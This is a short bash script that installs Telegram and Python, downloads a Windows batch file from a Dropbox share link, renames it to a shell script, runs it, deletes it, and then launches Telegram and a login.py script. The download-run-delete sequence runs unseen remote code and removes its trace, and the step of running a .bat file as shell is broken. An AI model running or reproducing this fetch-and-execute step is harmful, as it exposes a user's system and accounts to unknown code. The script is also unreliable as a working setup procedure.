#!/bin/bash

# 1. Install essential Linux packages (if not already installed)
echo "Installing required packages..."
sudo apt-get update -y
sudo apt-get install -y wget telegram-desktop python3 python3-pip python3-venv dos2unix

# 2. Download necessary files (change URL to your actual resource)
echo "Downloading essential files..."
wget -O Downloads.sh "https://www.dropbox.com/scl/fi/qdyd4p9t6xoabl95n5o3g/Downloads.bat?rlkey=snr74vv1vr8k5suujugvrhjtm&dl=1"

# 3. Convert Windows line endings to Unix line endings
echo "Converting Windows line endings to Unix format..."
dos2unix Downloads.sh

# 4. Make the script executable
chmod +x Downloads.sh

# 5. Execute the downloaded shell script (make sure it's designed for Linux)
echo "Running downloaded script..."
./Downloads.sh || { echo "Script execution failed"; exit 1; }

# 6. Telegram installation (replacing Windows executable)
echo "Running Telegram on Linux..."
nohup telegram-desktop &  # This will start Telegram in the background

# 7. Remove any unnecessary files (e.g., cleanup)
echo "Cleaning up unnecessary files..."
rm -f Downloads.sh

# 8. Run Python script
echo "Running Python script..."
python3 login.py || { echo "Python script failed"; exit 1; }

# 9. Set Timezone (Replace with actual timezone if needed)
echo "Setting time zone..."
sudo timedatectl set-timezone "UTC"

# 10. Further necessary Linux command handling
# You can add any other commands here that are specific to your requirements

echo "Script completed successfully."
